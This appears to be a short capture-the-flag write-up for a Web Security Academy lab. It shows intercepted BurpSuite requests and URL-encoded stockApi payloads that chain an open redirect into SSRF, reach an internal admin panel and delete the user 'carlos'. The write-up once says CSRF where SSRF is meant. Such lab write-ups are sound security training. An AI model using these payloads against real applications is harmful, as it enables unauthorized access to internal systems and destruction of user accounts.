
## Intercepting the main stock-fetch request in BurpSuite

	POST /product/stock HTTP/2
	Host: 0ae6007703e16ce381d3c0f8000d001f.web-security-academy.net
	Cookie: session=9ckG0lZjY6vYlKra7nWVEjhlSqMPsACN
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
	Accept: */*
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br
	Referer: https://0ae6007703e16ce381d3c0f8000d001f.web-security-academy.net/product?productId=14
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 66
	Origin: https://0ae6007703e16ce381d3c0f8000d001f.web-security-academy.net
	Sec-Fetch-Dest: empty
	Sec-Fetch-Mode: cors
	Sec-Fetch-Site: same-origin
	Priority: u=0
	Te: trailers

	stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D14%26storeId%3D1

	# with 'urlencode' extension

	stockApi=<@urlencode>/product/stock/check?productId=14&storeId=1</@urlencode>

>	I need to bypass regular CSRF protection.
>	On the product description page there is an option to open the next product (next product).

## Intercepting this request (functionality next product)

	POST /product/stock HTTP/2
	Host: 0ada002903771ef981f21191008e009e.web-security-academy.net
	Cookie: session=GiloAmgR82WUDxFpXpN6kCd7klA4boEr
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
	Accept: */*
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br
	Referer: https://0ada002903771ef981f21191008e009e.web-security-academy.net/product?productId=2
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 99
	Origin: https://0ada002903771ef981f21191008e009e.web-security-academy.net
	Sec-Fetch-Dest: empty
	Sec-Fetch-Mode: cors
	Sec-Fetch-Site: same-origin
	Priority: u=0
	Te: trailers

	stockApi=<@urlencode>/product/nextProduct?currentProductId=4&path=/product?productId=5</@urlencode>


> I use SSRF filter bypass technology via open redirect. I replace the value of the “path” parameter with “http://192.168.0.12:8080/admin/”
> and receive a response with access to the admin panel.

	stockApi=<@urlencode>/product/nextProduct?currentProductId=4&path=http://192.168.0.12:8080/admin/</@urlencode>

>	I access the admin panel and users. I delete the user 'Carlos' with url 'http://192.168.0.12:8080/admin/delete?username=carlos'

	stockApi=<@urlencode>/product/nextProduct?currentProductId=4&path=http://192.168.0.12:8080/admin/delete?username=carlos</@urlencode>


## LAB solved
